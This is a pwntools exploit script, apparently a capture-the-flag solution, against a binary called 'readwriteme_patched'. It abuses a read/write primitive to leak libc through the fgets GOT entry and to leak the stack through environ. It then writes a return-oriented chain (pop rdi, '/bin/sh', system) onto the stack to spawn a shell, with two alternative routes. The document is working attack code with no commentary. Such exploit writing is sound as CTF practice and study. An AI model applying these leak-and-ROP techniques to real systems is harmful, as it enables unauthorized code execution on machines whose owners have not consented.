#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('readwriteme_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x40134E  
        b*0x401394 
        b*0x040140A  
        b*0x04013C1   
        b*0x0401305
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])

def payload(data1, data2, data3):
    sl(data1)
    sl(data2)
    sl(data3)
p.recvuntil(b'GO\n')
payload(b'h', f'{hex(exe.got.fgets)}'.encode(), b'8')

libc_leak = int(p.recv(18), 16)
libc_leak = int.from_bytes(libc_leak.to_bytes(8, 'big'), 'little')
libc.address = libc_leak - libc.sym.fgets
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

payload(b'h', f'{hex(libc.sym.environ)}'.encode(), b'8')
sleep(1)
stack_leak = int(p.recv(18), 16)
stack_leak = int.from_bytes(stack_leak.to_bytes(8, 'big'), 'little')
info(f'stack leak: {hex(stack_leak)}')
pop_rdi = 0x00000000000277e5 + libc.address

def way2():
    load = b'h'*8 + flat(
        pop_rdi+1,
        libc.sym.system)
    payload(load, f'{hex(stack_leak- 0x3b8)}'.encode(), b'158')

    load = b'h'*8 + flat(
        # stack_leak,
        pop_rdi,
        next(libc.search(b'/bin/sh')),
    )
    payload(load, f'{hex(stack_leak- 0x3b0 + 0x8)}'.encode(), b'148')
    sl(b'36')



def way1():
    payload(b'w', f'{hex(stack_leak- 0x120)}'.encode(), b'8')
    s(p64(pop_rdi))
    payload(b'w', f'{hex(stack_leak- 0x120 + 8)}'.encode(), b'8')
    s(p64(next(libc.search(b'/bin/sh'))))

    payload(b'w', f'{hex(stack_leak- 0x120 + 0x10)}'.encode(), b'8')
    s(p64( pop_rdi+1))

    payload(b'w', f'{hex(stack_leak- 0x120 + 0x18)}'.encode(), b'8')
    s(p64(libc.sym.system))
    sl(b'36')
# GDB()
# way1()
way2()

p.interactive()
